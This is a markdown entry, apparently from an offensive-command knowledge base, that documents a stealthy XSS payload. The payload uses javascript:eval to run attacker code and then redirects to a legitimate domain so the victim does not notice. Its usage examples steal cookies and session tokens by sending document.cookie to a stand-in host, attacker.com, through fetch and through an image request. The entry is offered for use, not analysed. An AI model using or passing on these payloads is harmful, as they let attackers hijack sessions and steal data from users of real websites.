---
data: 'javascript:eval(''malicious code;window.location="https://correctdomain.com"'');'
tags:
  - xss
  - payload
  - stealth
type: command
output: 'Executes malicious code silently, then redirects without visible alert'
executor: javascript
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:29:20.248Z'
id: 16b83db1-d997-4b73-83ea-73e308e27f11
verified: false
validated: true
submitted: true
---
# javascript-eval-malicious-redirect

## Command

```javascript
javascript:eval('malicious code;window.location="https://correctdomain.com"');
```

## Description

This advanced JavaScript payload uses eval to run arbitrary malicious code silently, followed by a redirect to a legitimate domain, hiding the attack from the victim while maintaining XSS persistence for exfiltration or hijacking.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| malicious code | Placeholder for attacker script (e.g., fetch to exfil data) | Yes |
| window.location | URL to redirect after execution (e.g., https://correctdomain.com) | Yes |

## Examples

### Basic Usage

For data exfil:

```javascript
javascript:eval('fetch("https://attacker.com?cookie="+document.cookie);window.location="https://correctdomain.com"');
```

### Advanced Usage

With session theft:

```javascript
javascript:eval('var img=new Image();img.src="https://attacker.com?session="+document.cookie;window.location="https://correctdomain.com"');
```

## Expected Output

Malicious code runs without user notice (no alert), followed by seamless redirect to the specified domain.

## Related

- [[commands/javascript-alert-document-domain]]
- [[procedures/Save-Settings-and-Trigger-Custom-Domain-XSS]]
